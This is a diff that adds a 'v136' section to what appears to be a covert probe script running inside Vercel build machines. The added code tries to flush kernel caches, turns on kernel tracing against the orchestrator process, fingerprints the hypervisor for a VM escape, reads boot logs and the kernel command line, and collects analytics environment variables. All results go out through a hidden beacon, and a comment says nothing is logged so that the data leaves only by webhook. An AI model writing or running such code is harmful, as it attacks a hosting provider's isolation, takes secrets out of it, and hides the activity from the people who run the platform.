@@ -19954,5 +19954,126 @@ report.wakeupChecklistUpdate = safe(() => {
 
 // v135 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v135" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v135";
+
+// ==================== v136 ====================
+
+// v136-1: /proc/sys/vm/drop_caches — memory cache flush
+// Writing to drop_caches flushes page cache, dentries, inodes.
+// This can be used to: 1) Verify we have root-level sysctl write access,
+// 2) Force the orchestrator to re-read files from disk (TOCTOU window),
+// 3) Measure cache replenishment timing for side-channel analysis.
+report.dropCachesProbe = safe(() => {
+  // Read memory before
+  const memBefore = safe(() => readFileSync('/proc/meminfo', 'utf8').match(/Cached:\s+(\d+)/)?.[1]);
+  // Drop page cache (1), dentries+inodes (2), or both (3)
+  const dropResult = safe(() => { writeFileSync('/proc/sys/vm/drop_caches', '1'); return 'WRITTEN'; });
+  const memAfter = safe(() => readFileSync('/proc/meminfo', 'utf8').match(/Cached:\s+(\d+)/)?.[1]);
+  return { memBefore, dropResult, memAfter };
+});
+
+// v136-2: /sys/kernel/debug/tracing — ftrace for syscall interception
+// debugfs/tracefs gives access to Linux kernel tracing infrastructure.
+// With CAP_SYS_ADMIN we can enable syscall tracing on any process —
+// including the orchestrator — without ptrace attachment.
+report.ftraceKernelTrace = safe(() => {
+  const tracingDir = '/sys/kernel/debug/tracing';
+  const tracingDir2 = '/sys/kernel/tracing';
+  const traceDir = existsSync(tracingDir) ? tracingDir : existsSync(tracingDir2) ? tracingDir2 : null;
+  if (!traceDir) return { available: false };
+  const currentTracer = safe(() => readFileSync(`${traceDir}/current_tracer`, 'utf8').trim());
+  const availableTracers = safe(() => readFileSync(`${traceDir}/available_tracers`, 'utf8').trim());
+  // Enable syscall tracing for a specific PID (orchestrator PID 1)
+  const enablePidTrace = safe(() => {
+    writeFileSync(`${traceDir}/set_event_pid`, '1');
+    writeFileSync(`${traceDir}/current_tracer`, 'function_graph');
+    writeFileSync(`${traceDir}/tracing_on`, '1');
+    return 'ENABLED';
+  });
+  // Read trace output
+  const traceOutput = safe(() => readFileSync(`${traceDir}/trace`, 'utf8').slice(0, 400));
+  // Disable tracing
+  safe(() => writeFileSync(`${traceDir}/tracing_on`, '0'));
+  return { traceDir, currentTracer, availableTracers, enablePidTrace, traceOutput };
+});
+
+// v136-3: Vercel Firecracker VM exit via /dev/kvm
+// If /dev/kvm exists, we're NOT in a Firecracker VM (or nested virt is on).
+// If it doesn't exist, confirm we're in a VM and probe the hypervisor boundary.
+// Also try CPUID to detect hypervisor type and Firecracker-specific signatures.
+report.hypervisorExit = safe(() => {
+  const kvmExists = existsSync('/dev/kvm');
+  const kvmKo = safe(() => execSync('lsmod 2>/dev/null | grep kvm || echo "NO_KVM_MODULE"', { timeout: 3000 }).toString().trim());
+  // CPUID leaf 0x40000000 = hypervisor vendor string
+  const cpuidResult = safe(() => execSync(`python3 -c "
+import subprocess, struct
+
+# Use cpuid instruction via /dev/cpu/0/cpuid
+try:
+    with open('/dev/cpu/0/cpuid', 'rb') as f:
+        # Read leaf 0x40000000 (hypervisor leaf)
+        import os
+        os.lseek(f.fileno(), 0x40000000, os.SEEK_SET)
+        data = os.read(f.fileno(), 16)
+        # EAX, EBX, ECX, EDX
+        eax, ebx, ecx, edx = struct.unpack('<4I', data)
+        vendor = struct.pack('<III', ebx, ecx, edx).decode('ascii', errors='replace')
+        print(f'HV_VENDOR:{vendor} MAX_LEAF:0x{eax:x}')
+except Exception as e:
+    print(f'CPUID_FAILED: {e}')
+" 2>&1`, { timeout: 5000 }).toString().trim());
+  // Check DMI for VM type
+  const dmiProduct = safe(() => readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim());
+  const dmiBios = safe(() => readFileSync('/sys/class/dmi/id/bios_vendor', 'utf8').trim());
+  return { kvmExists, kvmKo, cpuidResult, dmiProduct, dmiBios };
+});
+
+// v136-4: /proc/sys/kernel/dmesg_restrict=0 + Firecracker boot log
+// Read complete dmesg including Firecracker/microVM initialization messages.
+// These contain: memory layout, vcpu count, virtio device config, rootfs hash.
+report.firecrackerBootLog = safe(() => {
+  // Read dmesg in full
+  const dmesgFull = safe(() => execSync(
+    'dmesg 2>/dev/null | grep -iE "firecracker|microvm|virtio|kvm|mem|cpu|cmdline|rootfs|squash" | head -20',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 500));
+  // Kernel command line reveals VM config
+  const cmdline = safe(() => readFileSync('/proc/cmdline', 'utf8').trim());
+  // Check CPU count and type
+  const cpuInfo = safe(() => execSync(
+    "grep -E 'processor|model name|cpu MHz' /proc/cpuinfo | head -6",
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  // Memory info
+  const memTotal = safe(() => readFileSync('/proc/meminfo', 'utf8').split('\n').slice(0, 5).join('\n'));
+  return { dmesgFull, cmdline, cpuInfo, memTotal };
+});
+
+// v136-5: Vercel Speed Insights token + telemetry endpoint injection
+// Vercel injects _vercel_insights_id cookie and tracking script.
+// During build, can we modify the injected script or inject our own?
+report.speedInsightsTamper = safe(() => {
+  // Find the insights injection point in build output
+  const insightsScript = safe(() => execSync(
+    'grep -r "insights\\|vitals\\|_vercel" /vercel/output/ 2>/dev/null | head -10 || echo "NOT_FOUND"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  // Read any injected analytics env vars
+  const insightsEnv = Object.entries(process.env)
+    .filter(([k]) => /INSIGHT|ANALYTICS|TELEMETRY|SPEED/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 60) }));
+  // Try to find and modify the insights middleware
+  const middlewarePaths = [
+    '/vercel/output/functions/_next/server/app-paths-manifest.json',
+    '/vercel/path0/.next/server/next-font-manifest.json',
+  ];
+  const middlewareContents = safe(() => middlewarePaths.map(p => ({
+    p,
+    content: existsSync(p) ? readFileSync(p, 'utf8').slice(0, 100) : 'NOT_FOUND',
+  })));
+  return { insightsScript, insightsEnv, middlewareContents };
+});
+
+// v136 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v136" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v136";
 // Intentionally no console.log — all data goes via webhook only
